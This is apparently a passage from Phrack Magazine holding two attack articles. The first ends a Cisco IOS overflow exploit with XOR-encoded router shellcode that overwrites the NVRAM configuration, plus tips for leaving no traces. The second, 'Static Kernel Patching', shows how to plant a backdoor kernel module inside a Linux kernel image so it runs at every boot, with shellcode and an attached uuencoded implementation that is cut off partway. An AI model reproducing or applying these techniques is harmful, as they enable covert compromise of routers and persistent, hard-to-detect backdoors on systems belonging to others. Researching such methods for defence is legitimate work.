		$_=$_^$pattern if($pattern);
		$hexcode.=sprintf(&quot;\\x%02X&quot;,$_);
	}
	print &quot;\t\&quot;&quot;.$hexcode.&quot;\&quot;&quot;.$tabs.&quot;//&quot;.$mnemonic.&quot; (0x&quot;.$alc.&quot;)\n&quot;;
    }
}
--- end objdump2c.pl ---

You can use the output of objdump and pipe it into the script. If the
script got no parameter, it will produce the C char string without
modifications. The first optional paramter will be your XOR pattern and the
second one can be the address your buffer is going to reside at. This makes
debugging the code a hell of a lot easier, because you can refer to the
comment at the end of your C char string to find out which command made the
Cisco unhappy.

The output for our little config_copy.s code XOR&#039;d with 0xD5 looks like
this (trimmed for phrack):

linux# m68k-aout-objdump -d config_copy.o |
&gt; ./objdump2XORhex.pl 0xD5 0x020F2A24

&quot;\x93\x29\xF2\xD5&quot;              //movew #9984,%sr (0x020F2A24)
&quot;\xF7\xA9\xDA\x25\xC5\x17&quot;      //moveal #267391170,%a1 (0x020F2A28)
&quot;\xE7\x69\xD5\xD4&quot;              //movew #1,%a1@ (0x020F2A2E)
&quot;\x90\x2F\xD5\x87&quot;              //lea %pc@(62 &lt;config&gt;),%a2 (0x020F2A32)
&quot;\xF7\xA9\xDB\xD5\xD7\x7B&quot;      //moveal #234881710,%a1 (0x020F2A36)
&quot;\xA1\xD4&quot;                      //moveq #1,%d2 (0x020F2A3C)
&quot;\xC7\x0F&quot;                      //moveb %a2@+,%a1@+ (0x020F2A3E)
&quot;\xF7\xE9\xD5\xD5\x2A\x2A&quot;      //movel #65535,%d1 (0x020F2A40)
&quot;\x46\x97&quot;                      //subxw %d2,%d1 (0x020F2A46)
&quot;\xBE\xD5\x2A\x29&quot;              //bmiw 22 &lt;write_delay&gt; (0x020F2A48)
&quot;\xD9\x47\x1F\x2B\x25\xD8&quot;      //cmpil #-889262067,%a2@ (0x020F2A4C)
&quot;\xB3\xD5\x2A\x3F&quot;              //bnew 1a &lt;copy_confg&gt; (0x020F2A52)
&quot;\xE7\x29\xD5\xD5&quot;              //movew #0,%a1@+ (0x020F2A56)
&quot;\xF7\xE9\xD5\xD5\x2A\x2A&quot;      //movel #65535,%d1 (0x020F2A5A)
&quot;\x46\x97&quot;                      //subxw %d2,%d1 (0x020F2A60)
&quot;\xBE\xD5\x2A\x29&quot;              //bmiw 3c &lt;write_delay2&gt; (0x020F2A62)
&quot;\x66\x29\xDB\xD5\xF5\xD5&quot;      //cmpal #234889216,%a1 (0x020F2A66)
&quot;\xB8\xD5\x2A\x3D&quot;              //bltw 32 &lt;delete_confg&gt; (0x020F2A6C)
&quot;\x93\x29\xF2\xD5&quot;              //movew #9984,%sr (0x020F2A70)
&quot;\xF5\xA9\xDA\x25\xD5\xD5&quot;      //moveal #267386880,%a0 (0x020F2A74)
&quot;\xFB\x85&quot;                      //moveal %a0@,%sp (0x020F2A7A)
&quot;\xF5\xA9\xDA\x25\xD5\xD1&quot;      //moveal #267386884,%a0 (0x020F2A7C)
&quot;\xF5\x85&quot;                      //moveal %a0@,%a0 (0x020F2A82)
&quot;\x9B\x05&quot;                      //jmp %a0@ (0x020F2A84)

Finally, there is only one more thing to do before we can compile this all
together: new have to create the new NVRAM header and calculate the
checksum for our new config. The NVRAM header has the form of:

typedef struct {
    u_int16_t       magic;  	// 0xABCD
    u_int16_t       one;	// Probably type (1=ACII, 2=gz)
    u_int16_t       checksum;
    u_int16_t       IOSver;
    u_int32_t       unknown;	// 0x00000014
    u_int32_t       cfg_end;	// pointer to first free byte in
				// memory after config
    u_int32_t       size;
} nvhdr_t;

Obviously, most values in here are self-explainory. This header is not
nearly as much tested as the memory structures, so IOS will forgive you
strange values in the cfg_end entry and such. You can choose the IOS
version, but yours truly recommends to use something along the lines of
0x0B03 (11.3), just to make sure it works. The size field covers only the
real config text - not the header.
The checksum is calculated over the whole thing (header plus config) with
the checksum field itself being set to zero. This is a standard one&#039;s
complement checksum as you find in any IP implementation.

When putting it all together, you should have something along the lines of:

 +--------------+
 | AAAAAAAAAAAA |
 ...
 | AAAAAAAAAAAA |
 +--------------+
 | FAKE BLOCK   |
 |              |
 ....
 +--------------+
 | Bootstrap    |
 |              |
 ....
 +--------------+
 | config_copy  |
 |   XOR pat    |
 ....
 +--------------+
 | NVRAM header |
 | + config     |
 |   XOR pat    |
 ....
 +--------------+

...which you can now send to the Cisco router for execution. If everything
works the way it is planned, the router will seemingly freeze for some
time, because it&#039;s working the slow loops for NVRAM copy and does not allow
interrupts, and should then reboot clean and nice.

To save space for better papers, the full code is not included here but is
available at http://www.phenoelit.de/ultimaratio/UltimaRatioVegas.c . It
supports some adjustments for code offset, NOPs where needed and a slightly
different fake block for 11.1 series IOS.

--[ 6 - Everything not covered in 1-5

A few assorted remarks that somehow did not fit into the rest of this text
should be made, so they are made here.

First of all, if you find or know an overflow vulnerability for IOS 11.x
and you think that it is not worth all the trouble to exploit since
everyone should run 12.x by now, let me challange this. Nobody with some
experience on Cisco IOS will run the latest version. It just doesn&#039;t work
correctly. Additionally, many people don&#039;t update their routers anyway. But
the most interesting part is a thing called &quot;Helper Image&quot; or simply &quot;boot
IOS&quot;. This is a mini-IOS loaded right after the ROM monitor, which is
normally a 11.x. On the smaller routers, it&#039;s a ROM image and can not be
updated easily. For the bigger ones, people assured me that there are no
12.x mini-IOSes out there they would put on a major production router. Now,
when the Cisco boot up and starts the mini-IOS, it will read the config and
work accordingly as long as the feature is supported. Many are - including
the TFTP server. This gives an attacker a 3-8 seconds time window in which
he can perform an overflow on the IOS, in case somone reloads the router.
In case this goes wrong, the full-blown IOS still starts up, so there will
be no traces of any hostile activity.

The second item yours truly would like to point out are the different
things one might want to explore for overflow attacks. The obvious one
(used in this paper as example) is a service running on a Cisco router.
Another point for overflowing stuff are protocols. No protocol inspection
engine is perfect AFAYTK. So even if the IOS is just supposed to route
the packet, but has to inspect the contents for some reason, you might find
something there. And if all fails, there are still the debug based
overflows. IOS offers a waste amount of debug commands for next to
everything. These do normally display a lot of information comming right
from the packet they received and don&#039;t always check the buffer they use
for compiling the displayed string. Unfortunately, it requires someone to
turn on debugging in the first place - but well, this might happen.

And finally, some greets have to be in here. Those go to the following
people in no particular order: Gaus of Cisco PSIRT, Nico of Securite.org,
Dan of DoxPara.com, Halvar Flake, the three anonymous CCIEs/Cisco wizards
yours truly keeps asking strange questions and of course FtR and Mr. V.H.,
because without their equipment, there wouldn&#039;t be any research to speak
of. Additional greets go to all people who research Cisco stuff and to whom
yours truly had no chance to talk to so far - please get in touch with us.
The last one goes to the vulnerability research labs out there: let me
know if you need any help reproducing this `;-7

--[ A - References

[1] anonymous &lt;d45a312a@author.phrack.org&gt;
    &quot;Once upon a free()...&quot;
    Phrack Magazine, Volume 0x0b, Issue 0x39, Phile #0x09 of 0x12

[2] Cisco Router IOS Memory Maps
    http://www.cisco.com/warp/public/112/appB.html

[3] GNU binutils
    http://www.gnu.org/software/binutils/binutils.html

[4] Motorola QUICC 68360 CPU Manual
    MC68360UM, Page 6-70


|=[ EOF ]=---------------------------------------------------------------=|



--------------------------------------------------------------------------------


                             ==Phrack Inc.==

               Volume 0x0b, Issue 0x3c, Phile #0x08 of 0x10

|=-------------------=[ Static Kernel Patching ]=------------------------=|
|=-----------------------------------------------------------------------=|
|=-----------------=[ jbtzhm &lt;jbtzhm@nsfocus.com&gt; ]=---------------------=|
|=---------------------[ http://www.nsfocus.com ]=-----------------------=|


--[ Contents

  1 - Introduction

  2 - Get kernel from the image

  3 - Allocate some space in image

  4 - Relocate the symbol in module file

  5 - Make it autorun when reboot

  6 - Possible solutions

  7 - Conclusion

  8 - References

  9 - Appendix: The implementation


--[ 1 - Introduction

This paper will show a simple way to patch a common LKM into the
static linux kernel image.Most kernel backdoors are implemented by loadable
kernel module which is loaded into kernel by insmod or /dev/kmem,and the 
backdoor module can found easily if the disk can be mounted on other 
machines.It is not the expected result.What is wanted is just to find a
method to put the LKM into kernel image,and make it run when reboot.

The program attached in the appendix contains codes and debugs in redhat7.2
(Intel)default installation,and can be easily tested on other kernel 
versions by some modification.Also the program is based on the 
/boot/System.map file which contains the kernel symbol address.If the file
doesn&#039;t exist on your system,more works have to be done to make it run.

--[ 2 - Get kernel from the image

The first step is getting kernel from image file that is usually compressed
(uncompress image is not concerned because it is much easier).The image
file can be analyzed from the kernel source files,and Makefile will
clarify the structure of the image.

[/usr/src/linux/arch/i386/boot/Makefile]

..
zImage: $(CONFIGURE) bootsect setup compressed/vmlinux tools/build
        $(OBJCOPY) compressed/vmlinux compressed/vmlinux.out
        tools/build bootsect setup compressed/vmlinux.out $(ROOT_DEV) &gt;
zImage
..
(bzImage is similar)

bootsect: bootsect.o
        $(LD) -Ttext 0x0 -s --oformat binary -o $@ $&lt;

bootsect.o: bootsect.s
        $(AS) -o $@ $&lt;

bootsect.s: bootsect.S Makefile $(BOOT_INCL)
        $(CPP) $(CPPFLAGS) -traditional $(SVGA_MODE) $(RAMDISK) \
$&lt; -o $@

..
setup: setup.o
        $(LD) -Ttext 0x0 -s --oformat binary -e begtext -o $@ $&lt;

setup.o: setup.s
        $(AS) -o $@ $&lt;

setup.s: setup.S video.S Makefile $(BOOT_INCL) $(TOPDIR)\
/include/linux/version.h $(TOPDIR)/include/linux/compile.h
        $(CPP) $(CPPFLAGS) -D__ASSEMBLY__ -traditional \
$(SVGA_MODE) $(RAMDISK) $&lt; -o $@

The bootsect and setup file are easy to understand.They are created by
bootsect.s and setup.s respectively.The vmlinux.out file is raw binary
file generated by objcopy command.The value of $(OBJCOPY) is
&quot;objcopy -O binary -R .note -R .comment -S&quot;. More details are available
by `man objcopy`.When the three files are ready the build program will
bind the three files to on file which is the kernel image file.
However the vmlinx file is generated more complicatedly.It is also possible
to go into the compressed directory and look through the Makefile.

[/usr/src/linux/arch/i386/boot/compressed/Makefile]
..
vmlinux: piggy.o $(OBJECTS)
        $(LD) $(ZLINKFLAGS) -o vmlinux $(OBJECTS) piggy.o

The $(OBJECTS) includes head.o and misc.o,compiled by head.S and
misc.c respectively.The most important step in head.S is calling
the decompress_kernel function in misc.c.The function will inflate
the compressed kernel.When the decompress_kernel takes effect,it requires
input_len and input_data symbol which are defined in piggy.o

..
piggy.o:        $(SYSTEM)
        tmppiggy=_tmp_$$$$piggy; \
        rm -f $$tmppiggy $$tmppiggy.gz $$tmppiggy.lnk; \
        $(OBJCOPY) $(SYSTEM) $$tmppiggy; \
        gzip -f -9 &lt; $$tmppiggy &gt; $$tmppiggy.gz; \
        echo &quot;SECTIONS { .data : { input_len = .; \
        LONG(input_data_end - input_data) input_data = .; \
        *(.data) input_data_end = .; }}&quot; &gt; $$tmppiggy.lnk;
        $(LD) -r -o piggy.o -b binary $$tmppiggy.gz -b elf32-i386 -T \
        $$tmppiggy.lnk;
        rm -f $$tmppiggy $$tmppiggy.gz $$tmppiggy.lnk

The piggy.o file is a common ELF object file.However,it only contains data
section.The ld requires a command file like this\

SECTIONS { .data : { input_len = .; LONG(input_data_end - input_data)\
input_data = .; *(.data) input_data_end = .; }}

The command file enables the piggy.o to have the symbol which is required 
by misc.o.Hopefully the command &quot;gzip -f -9&quot; also can be seen. It just 
compressed the kernel file compiled by thousands of kernel source files.

So the kernel image could be described like this
[bootsect][setup][[head][misc][compressed_kernel]]

Now let us understand more about the boot process.
The process can be separated into the following some logical stages:
1.BIOS selects the boot device.
2.BIOS loads the [bootsecto] from the boot device.
3.[bootsect] loads [setup] and [[head][misc][compressed_kernel]].
4.[setup] do sth. and jmp to [head](it is at 0x1000 or 0x100000).
5.[head] call uncompressed_kernel in [misc].
6.[misc] uncompressed [compressed_kernel] and put it at 0x100000.
7.high level init(begin at startup_32 in linux/arch/i386/kernel/head.S).

After the machine run into step 7,the high level initialization begins.

When the structure of the kernel image is clear,kernel text from the 
compressed image with a dirty method are easily available.It is matching
the compress-magic contained in image.It is also known the 4-byte number
before the magic is the input_data from which the offset can be verified.
After this gunzip the kernel is pretty easy.


--[ 3 - Allocate some space in image to use

The allocation here doesn&#039;t mean vmalloc or kmalloc method.It just means
space is required to contain the LKM file.The lkm file &gt;&gt; the kernel can
be easily catted,but it will not work.To find the reason,the best method is
to go back into the kernel initial code,which is all in step 7 mentioned 
above.

[/usr/src/linux/arch/i386/kernel/head.S]
..
/*
 * Clear BSS first so that there are no surprises...
 */
 xorl %eax,%eax
 movl $ SYMBOL_NAME(__bss_start),%edi
 movl $ SYMBOL_NAME(_end),%ecx
 subl %edi,%ecx
 cld
 rep
 stosb
..
After reading the head.S file,the above code can be found,which clearly
expressed that it will clarify BSS range.The BSS area contains the
uninitialized variable which is not included in the kernel file,but the
kernel memory will leave the area to bss.So the lkm will be clear if just 
appending the code to the kernel.To solve the problem some dummy data
can be added before the code the length of which is just equal to the bss
size.Though it will make the new kernel much larger,the compressed will 
help to deflate all the zero data effectively.

However there is also another problem.Read through followed code

[/usr/src/linux/arch/i386/kernel/setup.c]
..
void __init setup_arch(char **cmdline_p)---called by start_kernel
..
 init_mm.
        /*
         * partially used pages are not usable - thus
         * we are rounding upwards:
         */
..
        start_pfn = PFN_UP(__pa(&amp;_end));start_code = (unsigned long) &amp;_text;
 init_mm.end_code = (unsigned long) &amp;_etext;
 init_mm.end_data = (unsigned long) &amp;_edata;
 init_mm.brk = (unsigned long) &amp;_end;//it is bss end
..

The kernel wouldn&#039;t leave any space to the lkm unreasonable,so it will 
manage the space available from the bss end which is just the beginning 
of the LKM code.Therefore,the _end symbol in text should be modified to 
give the start_pfn a larger value.Then the new kernel will be like this:

[modified kernel][all zero dummy][module]

--[ 4 - Relocate the symbol in module file

The module is common LKM file and its type is usually ELF object file,and
the object file need to be relocated before it could be used.The following
example make it easier to understand.

int init_module()
{
 char s[] = &quot;hello world\n&quot;;
 printk(&quot;%s\n&quot;,s);
 return 0;
}
After compiling the program by command gcc,the module.o is available:

[root@linux-jbtzhm test]#gcc -O2 -c module.c

[root@linux-jbtzhm test]# objdump -x module.o|more
..
RELOCATION RECORDS FOR [.text]:
OFFSET   TYPE              VALUE
00000004 R_386_32          .rodata
00000009 R_386_32          .rodata
0000000e R_386_PC32        printk

[root@linux-jbtzhm test]# objdump -d module.o

test.o:     file format elf32-i386

Disassembly of section .text:

00000000 &lt;init_module&gt;:
   0:   55                      push   %ebp
   1:   89 e5                   mov    %esp,%ebp
   3:   68 00 00 00 00          push   $0x0
   8:   68 0d 00 00 00          push   $0xd
   d:   e8 fc ff ff ff          call   e &lt;init_module+0xe&gt;
  12:   31 c0                   xor    %eax,%eax
  14:   c9                      leave
  15:   c3                      ret

The object file structure is clear from the output of objdump.There are 
three entries in the text relocation section,and the offset shows the place
should be corrected.For the printk symbol,the type is R_386_PC32 which 
means relative call instruction(R_386_32 means absolute address).So after 
relocation the value of &quot;fc ff ff ff&quot; in the text that calls printk will 
be put out in the right value.

However,it is more complex than what can be described about the relocation,
and more information about it is available from ELF specifications.About 
the implementation of relocation Silvio had written many codes in his 
paper-RUNTIME KERNEL KMEM PATCHING-.Many lines are refereed from it and some
operations are added about uninitialized static and SHN_COMMON variables.


-- [ 5 - Make it autorun when reboot

After the above steps the new kernel appears like this
[modified kernel][all zero dummy][relocated module]

But the module don&#039;t have chance to be called,so the kernel running path 
has to be changed to call the function init_module in lkm.My method is 
adding some code between the dummy data and the module and changing the 
value of sys_call_table[SYS_getpid] to the code.Many programs (like init)
will call getpid when machine reboots,then the code will be called.

 char init_code[]={
&quot;\xE8\x00\x00\x00\x00&quot;          //call init_module
&quot;\xC7\x05\x00\x00\x00\x00\x11\x11\x11\x11&quot; //restore orig_getpid
&quot;\xE8\x11\x11\x11\x11&quot;          //call orig_getpid
&quot;\xC3&quot;                          //ret
};

All the relative and absolute addr is written by wrong value,but it is not
necessary to worry about that.When relocating the module the accurate
values about those address can be also make certain.

So the final new kernel had come int being.
[modified kernel][all zero dummy][init_code][relocated module]

Then the new kernel image followed the steps in Makefile is generated.Now
a new kernel patched by the module is available.

--[ 6 - Possible solutions

Deleting the /boot/System.map is the easiest way to prevent someone from
using this program without any modification.However Silvio had shown some 
ways to generate the kernel symbol list from kernel.So it is not the final
solutions.Adding some module to prevent kernel image from being modified is 
not a bad idea,but the precondition is the system should support the module.

When a kernel image was patched,its size and checksum could be detected,
so some function can be added to cheat the manager,but I don&#039;t have time
to do that.If you have more ideas please don&#039;t hesitate to contact me.

--[ 7 - Conclusion

Now it is clear that it is so easy to patch the kernel image.If the host
is compromised,nothing should be trusted,even if your own eyes.Halting the
machine and mounting the disk to another host is a good idea.

This paper is just for education.Please don&#039;t use it for other purposesA.
Sorry about my poor English and the dirty code of my program.Everything
should be better if I have more time.Though it could work well at
redhat 7.2,there maybe some problems if moved to all versions of linux
kernel.However,time is not enough for the tests on all kinds of
environment.

--[ 8 - References

 [1] Silvio&#039;s article describing run-time kernel patching (System.map)
     [http://www.big.net.au/~silvio/runtime-kernel-kmem-patching.txt]

 [2]  &quot;Complete Linux Loadable Kernel Modules. The definitive guide
      for hackers, virus coders and system administrators.&quot;
     [http://www.thehackerschoice.com/papers]

 [3] &lt;&lt;Linux Kernel:Scenarios and Analysis&gt;&gt; by Mao Decao and Hu Ximing

 [4] linux kernel source
     [http://www.kernel.org]

 [5] Linux Kernel 2.4 Internals
     [http://www.moses.uklinux.net/patches/lki.html]
 
At last,many thanks to Silvio the source about the relocation.Also to my
co-worker lgx who give me many good advise when i debug the program.At
the same time i extend special thanks to Hou Hanshu who help me correct
much grammar mistakes in english.

--[ 9 - Appendix: The implementation


begin 644 kpatch.tgz
M&#039;XL(`$\&#039;Y#T``^P\2W`&lt;QW6@1&quot;N&lt;M6++43Y.G#C-50CM_X&lt;?C2404A0HL42&quot;
M+`&quot;T(T.H]6)W%CO$[LQZ9Y8`*2&amp;1?8E\&lt;U4N.&lt;15KDH..215ON20N%*E0U*5
M2BZIW&#039;+3):=&lt;?/`E.:3R/MT]W;.S`,F8DE/F%`:[W?VZ^_5[K]]O&gt;N=PU(XZ
M_&gt;K&lt;L[QJM&lt;7:RM(2?-*5_.3O*TLK]5IM87%E&gt;:Y6K]&lt;6%^;$TC/%2EZ3,&amp;J/
MA9@;!T%T&amp;MQ9[?]/KT/F_^&#039;0&#039;58ZSVB.&amp;C!V&gt;7%Q%O^7:TO+Q/_:XG)]9;D!
M\(WZ4GU.U)X1/M;U&quot;\[_:D%\8^Q%KB_V&#039;XIM;_#`&quot;\1U-VR/77&amp;E0Y_AU2@8
MM1]5.M^&gt;5-SNI-*&gt;K&amp;=$07BBZW7]UR,Q#+I&gt;[Z&#039;PHHI8+&gt;&gt;AJ9IYS?,[@TD7
MA@BCKA=4^NMVU&lt;#;M^LZT&lt;.1FP0;&gt;_Z!73?Q/&gt;AMU_4Z?C28FB$YZ&lt;#S)\=5
M0&#039;4R&lt;--:4D;.TI[H9S,90&amp;72B&lt;1A^&#039;`X`##Q?L9)5!4&lt;WSV.FG&amp;]._;=00M:
M&#039;01I9DZ:4\/TW7;WE*&amp;P1[60&lt;0!.]-MA7X3&gt;(U&lt;,05S%OBO:OO#\R#T8MP=B
M%!RY8Q&#039;T1&#039;049(#ZF=&gt;Z;L_S7?&#039;.]KNW6V]?VWZ[M7WSFQO.4KV1C@06&lt;(I=
MN\-&gt;C$&#039;HBM[$[T1&gt;X(&lt;&quot;9:/M!X/@()B$(@H$[&quot;&quot;_VQYW1&lt;\;N&amp;(&lt;3&quot;*8/:P0
M+B&amp;BW8()QS!3#G`6A]T2X@YHAR7Q(/&quot;ZHK`_Z96$!,2/?`;H@C!C-WK0&#039;@`&gt;
M#G\3:V(0NNYA#@&gt;A`;8W-MYI;6_LY(&#039;X7D_D)-S%-6S.XP&quot;3L6^/PQ6`#0ZB
MIX8!3@QTCW!3_/S@R^BD($P((0/#U@@V3)3#&quot;HV/AT/T@K&#039;(&gt;8!*K0F[]DI&quot;
M+*&quot;N6,RC(&quot;8E411(.M9$;JHA/Z]EQ@,Q2&gt;G:F8S&#039;+F&quot;P)@S(&quot;HLVP!_U451R
M&quot;@J6CW,Q&amp;@XMI)?#KT[6;P_=57$)Q*[;&#039;&lt;.7P?%[?K9$;;)W&gt;1VGJ&quot;!@6CT0
M&lt;N)B/9)&lt;-P)B&amp;DSN7&gt;&lt;D`W\V33L#M^U/1C]_5,5!%.9GT7-J&amp;.PV30`$[8U=
M5XV2I%&gt;23$@*1#;7`:T0B4X?[&amp;@!N4&quot;$FOBA=^&quot;[73$(_`/1AXXFV$B3L(\D
MA,V!$T#?)K:)OB@&quot;@?00V&quot;=?&amp;`$4$-78%7TQ+W(VX459U&#039;EGT-Z%)7M^Z(ZC
MW)1F%@5L)5RG&quot;11TW&gt;94/3&amp;.V(&lt;X($PZ&amp;X?MP2#HY&#039;&quot;3!KUD&gt;U[M?.Z_)C;O
MW;JE-WZYCD-+&quot;8G%@&lt;B,)&gt;`5$AA5LP/FJ3-ZF)O&#039;@5C62X+_RYEY@7F%+/,Y
M&#039;653G)RX@$PA4FB2URS:ABW/]R)+`(;M$=&amp;42N$N&amp;!T4Y1LW;VV(0J_YA!L(
MI&quot;VI/AYGY\#@`-8+1JZ?`WQ*(CO.*K+W9M!&lt;[J#&gt;@1N%N5#3,,R71&quot;^/&amp;XK[
MF#LZ%B4V\HXC]T!)&quot;K@3*R#`![I%P62`@\\#2&#039;V9-AB)`N(4B@\^@+[XM987
M!P$85G&lt;\#L8T$&amp;V/9KS1&quot;R,Q/R^\,!RU.RZ4\GE1+([4&gt;-&quot;*H^&quot;`H]WZGE%H
M[,T:&#039;S9&lt;`_L#`F(T-=/%V5/E!4Z&#039;@L&amp;D\5$H8XTL8*G+-1)&quot;ZF!L26):&#039;EB?
MP`?4&quot;W&quot;P,PA&quot;-]=#(L6RER&amp;05;O95M58(RU(MEQ&gt;!].!!D.$QD#(\9/8%TJH
MA+`%WE,W7:L]E3*GW:OV[&gt;,K]=-T.E+R(A%[.,JEV$&#039;!_X&#039;PN(?4NN&lt;M2&amp;+)
M;&#039;-X$F]Z%&#039;VBV&amp;&lt;=K3R_?M:7BO_IXQEE`$Z/_Q&lt;:B[5%E?]IU!LUC/\7%QO/
MX_]/XX+X_]HDZH-.%??WHT?]H;C&quot;GU=#SV]7.L&amp;0HOT&amp;L*9&lt;KY&lt;;2U#&quot;BEM!
M%%+,V6_[AQ0%8J`Z=L&#039;Q:6.8*#KHW@``Q]QQ=@$[[T\P;J)&lt;@TPB&gt;,/1P!VB
M(L)A*OMA*$!#[0&lt;#B#3!_PN&amp;0QA2UASU71]&#039;B&gt;=SJ9&gt;&lt;J1(&amp;X$_&lt;QT`90@9L
M&amp;58268G9V8#&#039;S%&gt;D)2+2$A8IR0GP+X)1E.CZ,*P.AVU_NA:$,P46LR6A7=T.
MAVE)C&quot;N/).Y&amp;7L,=]#&quot;MD9+H4(F#UIL;;]Q[&quot;R!Z4*%+LO&#039;NULW-G1NYX[Q@
M*RN.,Z^Y$.5.`T&quot;]W_5Z\;@W;U][:Z-U^]H?.(NUKRW#WI&gt;Q5@$0@#]I&lt;KFJ
MWWX(B^\&lt;ZD!;50Q&lt;OY01UF7V\UVW.W!U+RY&quot;&#039;_1`;#S()\VR]&lt;_JMF_&gt;O,LM
M)E#EX!&amp;0)X/&lt;\#KL$P`?(G?8`O=R%WPJD:WN@X*H;E-M!6JS306.&#039;B^Y+&gt;PE
M&amp;;7@`G?0,ZQ;M2#FX%9WW6-H*4\W^9.A;(C7LWESIW5K8]-IU#.$&#039;&#039;KE+=R!
MNWMK[V&gt;R[QUO7&#039;[ON%8S[ZSC5*L=B%08F#&lt;#@EY?@&gt;:E)/A[Q_6Z&gt;6=%M3IV
MPR@8PRX?&gt;P&lt;MD.N1UU5S)8#U7`G0ZPM9#-AQJ,C,D4ETT-79&amp;/06&amp;JV-?G?L
MN/&quot;OJ6JVH5!P0JZR@DUGB*D&quot;#C4&lt;*!P#]U7)^(KN&gt;&#039;O?ZQXW.5@I%*#.I1P7
M9]_D/.@6HI8A#Y%=0XT#MD$MC,,Y(O!UV6&#039;DP4LBZ41F3D\B^$;&gt;0+EXZ.&#039;-
M\WB[/!&gt;&amp;0F&#039;4PO&#039;VV-.SO3P--&lt;.+2RX,&amp;!.O+&lt;&amp;!`G].KR0.\N1B814,6UZ7
M9-S5947JO=,&quot;0`6-;*ZXK;`/DF[0(V8[S(C_(4#6$T!91GY$-RQC;0LU)48\
MVV_OM&quot;&quot;^W+GVALR)V`SDY`=&amp;`&amp;MBBM=PY0SP?&#039;*5WAZGG?2DJ&#039;JJ,G[4&#039;?,2
MB`6#OI-`Z,04X0T37$R$IS*T/$GG)2F]3M_M&#039;$J.S60@*1Q.8L5[2A3&lt;!&quot;EY
MDZGD9+N;ZW5+`BOCM`*6\A03)VJ0LB-2=;DL]J6@VW&amp;/O2B&#039;21E&lt;`/@;&amp;[=N
M,,8A6F6&gt;284R+M&#039;0;7E=\`5*&quot;`I:&amp;+.F]$5.T9/A&#039;1@[F`RB^QL8*/E!A/`0
M[$W/2G.HL4DF`/F-G=;6QJT90R*2!$C#$N39(P_;G3[J8QS\=FOA\C*&amp;SNF-
MBY&gt;73YE9P&lt;88\&#039;&quot;P8[COV;@\&lt;,&lt;A^F$XW==;U^]M;6UL[IPRI8+&#039;V60HF#:)
M$KE!T.ZVY`[(L1K`!!T+&amp;3`NL5E9[0%ZG`Y&#039;$+U=@EXO=&quot;,C-&lt;X9`5.8J%?:
MBBGU(.?7&gt;3=S&#039;ZJT#Z=$XAR.&amp;IG[S&quot;*FW@&quot;X-GM&lt;$G^[YFSQMZCW]/O5,H),
MX*92Q@7)E)%4M:$V&gt;:QU+5VAYH)YL&quot;U=%S@XA-&quot;;/9XY7U#&quot;QKH:&lt;Y*&amp;0D;.
MF&amp;AJ_K`W1@2VX9^,00D]&#039;`M&quot;,@.K:FUTIU!0PSRYF,1&quot;&#039;&lt;\`4OU4(JU\6DO\
M3#*5B*4L?_3E_80W+$12&quot;)/M&gt;D)5&lt;:+,,=I/3L@K,9HVZ[P3S&#039;H6$P&gt;-&gt;$(B
MH+)8C`&lt;K%C..S*$&gt;&gt;5&amp;GG[#4W-1IARX9;&amp;3#JE5Q9V&lt;C4?&#039;&amp;S9UMK&#039;+V8;&amp;&#039;
MG-)2K=L[6V#PJ=525PJ;DE!Z*+;`&#039;M(U7@3:I&gt;XQ&gt;5?.E#&lt;#)/&quot;:L^8F9V-5
MNA7:GV?XV(VW-(BHQF50OUC5-,&gt;\NW7G+;5&gt;70F&amp;Z?%7&amp;&quot;,*D4-[,HBH:\]\
MX&quot;:-`C]\VPP@[/(A@!ICK*+8*&#039;+$K%5QR=//XBP^QDY-+-JT69QB40I+K`M5
M##]3$;(.V7(&#039;H@&quot;P,VS+E$-N:)]4KTTC//#\P[UF&lt;@14@]*/!NN(\R-+84&lt;.
MRNMC8&amp;&lt;OR,&gt;=KD&amp;\(63086(7M&lt;&lt;&#039;J:ZJGAP&#039;2HS3#3`;*U1?`L.Q15&#039;(V=E@
MVKW0DX^7S%5YY.C,==/4R4$SQ+?8R[&lt;PG^G5[]*3*162*.^1Z;:]TWKCYN:;
M.05&quot;I,--MKWS1NO6G&gt;O79CY4*&gt;@D-3VWP5A9.N^$GQ\\P.EVEVM[O&#039;O!PI&amp;M
MH]W`%BL:PQ=.O&gt;L=CDWKHEZCQQK*[Z2U%K$_/D`$]9=M;65+HB$]SOC!AIQ5
M)=A5!Q[&gt;43BIZCT.^;&#039;ID(7*&gt;,`@@;GKB:`&lt;R@Q(!19#G0*DGK+8#ZT&lt;DB&#039;N
M45ZG9U*80&gt;`4#V=XDH_&gt;-XXC=ZS3;EXH&lt;I?&quot;U4N#X[S&gt;]?$C22[GK$`\CU-*
M72!305&quot;@)SWQLV2)L%2+)&quot;)@.U&quot;Y\D.KZ8;UU$@1X.1&quot;92!E#[7]]F;K^IW;
MM^]LDC)GILI-HX`E41P=2C-G,J?KR(VMK3M;JV+B&lt;S*FJ^@%Q&quot;)&quot;&quot;3O,*Q;5
M4RYSEA/!WH1DDH41R*6M/,RU[56D&gt;IABIGH&amp;MJW1(=XA&#039;RG$U;B51`K;8I9E
MD%&gt;KO*4MI9066^L5I4-?7+,,F1V.9&amp;S*9E&#039;C8S2BH#&#039;ZX7G8`*&#039;]T:(X-5=&amp;
M$MSVUI3;H73ZSKMW-RRE3BB1&lt;=W&quot;B`L\C$UR.;3E--KNWMI9:*S:5=&gt;IAB6K
MO(;*O.E`S$OEXAH9&quot;=`,4.U0[&amp;MT-3I*P*8YKV&amp;P4P@FDJ9Z*\[$Q]::235S
M[6DD2UKITZ.6T[-;9R1XDO$`I;EL,=/Q.DUROQEG&lt;I1[,(J-(%6E9&amp;OD21?I
M[CK._5A)WS&gt;P-%&quot;83NC`V%+EWT&gt;?5NL&gt;1WLS5)+6ES4%MHWDUV3FBFKY(3FJ
M&quot;(24RB&lt;^;V.?J$&amp;=CV82!&gt;6QDG:LEE*&lt;)9S52&#039;U9V4`UD.PL-S9!F\9E*J,`
MTIA4@_$0I@Z,&#039;^V;Z:V$0GH,]0=*,J&#039;&amp;IRAFY+EG$LSN0&lt;0U93IQJDD?\JM-
M-;$#4C-CXJ%4[C(]_3/=&#039;PG%*E!VP+\Y`YS#ISR*2&gt;3YY!`X3DH?B3BNJ:C0
M9Q^KN#9KOTB&amp;5JL&gt;/88+`W&quot;P`@A,62&lt;%/24?\&quot;VVS5J\9,!T$1]T@%XR\K]:
M:*7&#039;ET#.I#6?2&quot;&#039;)/CT44/.Q:C#8XEV1H5I3GD9Z0@&lt;#,=3&gt;NNS)9&lt;1)XG[)
MEES.Y&lt;L!&#039;`E33/H$96O&lt;$W9++(@U21N&amp;F!Y&#039;A9?&lt;&amp;6J+19EGEMZS[%).$A5!
